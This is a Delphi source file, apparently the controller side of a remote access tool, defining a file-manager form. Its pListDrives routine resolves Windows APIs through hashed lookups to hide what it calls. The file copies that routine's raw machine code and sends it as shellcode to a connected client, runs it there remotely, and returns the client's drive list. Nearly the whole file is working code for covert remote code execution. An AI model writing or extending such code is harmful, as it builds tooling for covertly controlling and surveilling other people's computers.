unit untFilemanager;

interface

uses
  Winapi.Windows, Winapi.Messages, System.SysUtils, System.Variants, System.Classes, Vcl.Graphics,
  Vcl.Controls, Vcl.Forms, Vcl.Dialogs, Vcl.ExtCtrls, Vcl.ComCtrls,
  System.ImageList, Vcl.ImgList, Vcl.StdCtrls, untUtils, untClientObject;

type
  TForm2 = class(TForm)
    Panel1: TPanel;
    cmbDrives: TComboBox;
    btnBack: TButton;
    ImageList1: TImageList;
    btnRefresh: TButton;
    ListView1: TListView;
    Panel2: TPanel;
    Splitter1: TSplitter;
    ListView2: TListView;
    edtPath: TEdit;
  private
    { Private-Deklarationen }
  public
    { Public-Deklarationen }
    mClientThread:TClientThread;
    procedure InitializeForm(pClientThread:TClientThread);
  end;

var
  Form2: TForm2;

implementation

uses
  untCommands;
{$R *.dfm}
procedure pListDrives(pConn:PConnRec; pData:Pointer; dwLen:Cardinal);stdcall;
var
  lpszDrive: PChar;
  szBuffer: Array[0..MAX_PATH] Of Char;

  szDriveListBuffer: Array[0..1023] Of Char;
  szDriveInfo: Array[0..15] Of Char;
  iCount, iLoop, iType: Integer;
  xGetLogicalDriveStringsW:function(nBufferLength: DWORD; lpBuffer: LPWSTR): DWORD; stdcall;
  xGetDriveTypeW:function(lpRootPathName: LPCWSTR): UINT; stdcall;
  strPattern:Array[0..6] of Char;
begin
  xGetLogicalDriveStringsW := pConn.pAPI.xGetProcAddressEx(pConn.pAPI.hKernel32, $A0F5D331, 23);
  xGetDriveTypeW := pConn.pAPI.xGetProcAddressEx(pConn.pAPI.hKernel32, $0271D201, 13);
  strPattern[0]:='%';strPattern[1]:='s';strPattern[2]:='|';strPattern[3]:='%';strPattern[4]:='d';strPattern[5]:='#';strPattern[6]:=#0;
  pConn.pAPI.xZeroMemory(szDriveListBuffer, SizeOf(szDriveListBuffer));
  pConn.pAPI.xZeroMemory(szDriveInfo, SizeOf(szDriveInfo));
  iCount := xGetLogicalDriveStringsW(MAX_PATH, szBuffer) div 4;
  for iLoop := 0 to iCount - 1 do
  begin
    lpszDrive := PChar(@szBuffer[iLoop * 4]);
    case xGetDriveTypeW(lpszDrive) of
      DRIVE_FIXED:      iType := 1;
      DRIVE_CDROM:      iType := 2;
      DRIVE_REMOVABLE:  iType := 3;
    else
      iType := 1;
    end;
    pConn.pAPI.xwsprintfW(szDriveInfo,@strPattern[0], @lpszDrive[0], iType);
    pConn.pAPI.xlstrcatW(szDriveListBuffer, @szDriveInfo[0]);
  end;
  pConn.xSendBuffer(pConn, CMD_DRIVE_LIST, szDriveListBuffer, pConn.pAPI.xlstrlenW(szDriveListBuffer) * 2, False);
end;
procedure pListDrives_END();begin end;

procedure TForm2.InitializeForm(pClientThread:TClientThread);
var
  dwProcLen:Cardinal;
  pShell:PShellCode;
begin
  mClientThread := pClientThread;
  dwProcLen := DWORD(@pListDrives_END) - DWORD(@pListDrives);
  GetMem(pShell, dwProcLen + SizeOf(TShellCode));
  if pShell <> nil then
  begin
    pShell.dwLen := dwProcLen;
    pShell.dwID := 1;
    CopyMemory(Pointer(DWORD(pShell) + SizeOf(TShellCode) - SizeOf(Pointer)), @pListDrives, pShell.dwLen);
    mClientThread.SendBuffer(CMD_SHELLCODE_NEW,pShell,dwProcLen + SizeOf(TShellCode) - SizeOf(Pointer));
    FreeMem(pShell);
  end;
  GetMem(pShell, SizeOf(TShellCode));
  if pShell <> nil then
  begin
    pShell.dwLen := 0;
    pShell.dwID := 1;
    mClientThread.SendBuffer(CMD_SHELLCODE_CALL,pShell,SizeOf(TShellCode) - SizeOf(Pointer));
    FreeMem(pShell);
  end;

end;
end.
